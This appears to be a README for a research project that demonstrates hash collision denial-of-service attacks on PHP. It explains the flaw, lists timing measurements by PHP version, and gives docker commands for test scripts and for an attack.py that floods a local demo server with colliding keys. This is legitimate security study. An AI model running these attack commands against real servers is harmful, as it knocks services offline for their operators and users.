# Simulate Hash Collision Attack on a PHP Server

Checkout the [associated blog post](http://lukasmartinelli.ch/web/2014/11/17/php-dos-attack-revisited.html).

## How it works

PHP hashtables are vulnerable to complexity attacks. Every function
that takes external input and parses in a PHP hashtable is therefore
vulnerable to complexity attacks.

![Insert Animation](http://lukasmartinelli.ch/media/hash-collisions.gif)

## Test PHP vulnerabilities to Collision Attacks

In the directory `test` there are PHP scripts that demonstrate vulnerabilities of
functions that use the PHP map.

The file `collision_keys_small.txt` contains only 10k entries.
If you want to test out the real deal you should try these attacks
with `collision_keys.txt` (64k entries).

### Run tests

Run tests for inserting colliding keys into array:

```
docker run -it \
-v "$PWD":/usr/src/app -w /usr/src/app php:5.6-cli \
php test/array.php collision_keys.txt
```

Run tests for calling `json_decode` for JSON key-value pairs with colliding keys:

```bash
docker run -it --rm \
-v "$PWD":/usr/src/app -w /usr/src/app php:5.6-cli \
php test/json_decode.php collision_keys.txt
```

Run tests when `unserializing` an array with colliding keys:

```bash
docker run -it --rm \
-v "$PWD":/usr/src/app -w /usr/src/app php:5.6-cli \
php test/unserialize.php collision_keys.txt
```

#### Different PHP versions

Docker tags for official Docker PHP image:

- `5.4.43-cli`
- `5.5.27-cli`
- `5.6.11-cli`
- `7.0.0beta2-cli`

#### Measurements

Median in `seconds` of 100 samples for each measurement on a `m1.medium` instance.
Note that this is only a portion of evil keys consisting out of 10k keys.
Imagine what 64k evil keys kan do. 

**Good:**

PHP Version | `array`     | `json_decode` | `unserialize`
------------|-------------|---------------|----------------
5.4.43      | 0,0033      | 0,0022        | 0,0022
5.5.27      | 0,0034      | 0,0019        | 0,0022
5.6.11      | 0,0054      | 0,0019        | 0,0022
7.0.0beta2  | 0,0009      | 0,0009        | 0,0008

**Evil:**

PHP Version | `array`     | `json_decode` | `unserialize`
------------|-------------|---------------|----------------
5.4.43      | 1,2470      | 1,3896        | 1,3896
5.5.27      | 1,2355      | 1,4049        | 1,2786
5.6.11      | 1,2487      | 1,3999        | 1,3203
7.0.0beta2  | 0,3711      | 0,3737        | 0,3718


## Plot time difference

You can generate the plot data used for the diagrams by yourself:

```bash
docker run -it --rm \
-v "$PWD":/usr/src/app -w /usr/src/app php:5.6-cli \
php plot/json_decode.php collision_keys.txt
```

![json_decode time compared for collisions](/plot/json_decode_time.png)

## Run the server

```bash
docker run -it --rm -p 8080:80 -v "$PWD"/server:/var/www/html php:5.6-apache
```

Docker will map the port `80` of the webserver to `8080`.
Therefore you can visit your site at `localhost:8080`.

## Run a Hash Collision Attack

The `attack.py` script will make parallel requests (amount can be specified with `--count`)
to a URL endpoint. It reads collisions from given text file and tries to do a
Hash collision Attack with them. You can set the attack type to either use form fields
or a json map.


Make 100 good normal requests to a fake JSON API.

```bash
docker run --rm -t lukasmartinelli/php-dos-attack \
python ./attack.py http://172.17.42.1:8080/index.php collision_keys.txt --count=100 --type=json --no-collide
```

Make 100 bad requests to a fake JSON API.

```bash
docker run --rm -t lukasmartinelli/php-dos-attack \
python ./attack.py http://172.17.42.1:8080/index.php collision_keys.txt --count=100 --type=json
```

You can also run the form based attack (which has been fixed by an Appache workaround).

```bash
docker run --rm -t lukasmartinelli/php-dos-attack \
python ./attack.py http://172.17.42.1:8080/index.php collision_keys.txt --count=100
```

